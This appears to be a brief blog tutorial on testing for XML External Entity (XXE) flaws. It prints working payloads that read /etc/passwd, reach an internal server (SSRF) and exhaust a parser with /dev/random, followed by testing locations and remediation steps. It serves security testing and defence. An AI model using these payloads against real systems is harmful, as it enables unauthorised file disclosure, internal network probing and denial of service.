---
layout: post
title: "XML External Entity (XXE) Testing Guide"
date: 2026-07-14
---

XXE vulnerabilities can lead to file disclosure, SSRF, and denial of service. Here is my testing methodology.

## Payload Types

### 1. File Disclosure
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 2. SSRF via XXE
```xml
<!ENTITY xxe SYSTEM "http://internal-server/">
```

### 3. Denial of Service
```xml
<!ENTITY lol SYSTEM "file:///dev/random">
```

## Testing Locations

- File uploads accepting XML, SVG, DOCX, PPTX
- API endpoints accepting XML payloads
- SOAP web services
- RSS feed parsers

## Remediation

- Disable external entity processing
- Use JSON instead of XML where possible
- Validate and sanitize all XML input

*Research for educational purposes.*
